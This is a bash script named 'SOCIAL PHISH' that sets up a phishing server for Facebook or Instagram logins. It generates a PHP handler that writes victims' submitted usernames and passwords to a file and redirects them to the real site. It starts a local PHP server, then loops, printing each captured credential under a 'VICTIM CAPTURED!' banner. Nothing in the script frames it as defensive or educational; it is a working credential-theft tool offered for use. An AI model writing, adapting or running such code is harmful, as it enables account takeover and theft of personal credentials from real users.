#!/bin/bash
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
W='\033[0m'

cleanup() {
    pkill -f "php -S" > /dev/null 2>&1
    pkill -f "ssh -o" > /dev/null 2>&1
    rm -rf server_files
}
trap "cleanup; exit" SIGINT SIGTERM

clear
figlet "SOCIAL PHISH"
echo -e "$G      --- Phishing Module ---$W"
echo -e "$Y [1] Facebook"
echo -e "$Y [2] Instagram"
echo -e "$R [0] Back"
read -p " Select > " opt

if [ "$opt" == "0" ]; then exit; fi
if [ "$opt" == "1" ]; then site="facebook"; else site="instagram"; fi

# Simple Server Setup
cleanup
mkdir -p server_files
echo "<?php file_put_contents('usernames.txt', 'User: ' . \$_POST['username'] . ' Pass: ' . \$_POST['password'] . \"\n\", FILE_APPEND); header('Location: https://$site.com'); ?>" > server_files/index.php
touch server_files/usernames.txt

echo -e "$Y [*] Starting Server... $W"
cd server_files
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
echo -e "$G [✔] Link: http://127.0.0.1:8080 $W"

while true; do
    if [ -s usernames.txt ]; then
        echo -e "\n$R [★] VICTIM CAPTURED! $W"
        cat usernames.txt
        rm usernames.txt; touch usernames.txt
    fi
    sleep 1
done
